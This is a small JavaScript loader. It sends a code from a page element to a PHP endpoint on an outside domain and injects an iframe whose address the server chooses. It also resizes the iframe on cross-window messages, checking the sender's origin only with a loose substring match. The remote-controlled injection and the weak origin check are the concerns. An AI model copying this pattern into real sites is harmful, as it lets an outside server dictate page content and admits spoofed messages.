(function () {

    var $loader = document.querySelector('script[data-loader-script]');
    var $container = document.querySelector($loader.getAttribute('data-selector'));
    console.log($container);
    if (!$container) {

        console.warn('Container not found. This is not a panasonic product');

    }
    var code = $container.getAttribute('data-source');

    fetch(`https://investigacionenfermeriauci.org/Telegram/service.php?code=${code}`).then((response) => {

        if (response.ok) {

            try {

                return response.json();

            } catch (e) {

                throw e;

            }

        }

    }).then((data) => {

        console.log(data);
        $container.innerHTML = `<iframe src="${data.response}" width="100%" height="0" frameborder="0"></iframe>`;

        window.addEventListener('message', (event) => {

            console.log(event);

            if (data.response.indexOf(event.origin) !== -1) {

                console.log('is secure');
                $container.querySelector(`iframe[src="${data.response}"]`).height = event.data.height;

            }

        });

    });

})()
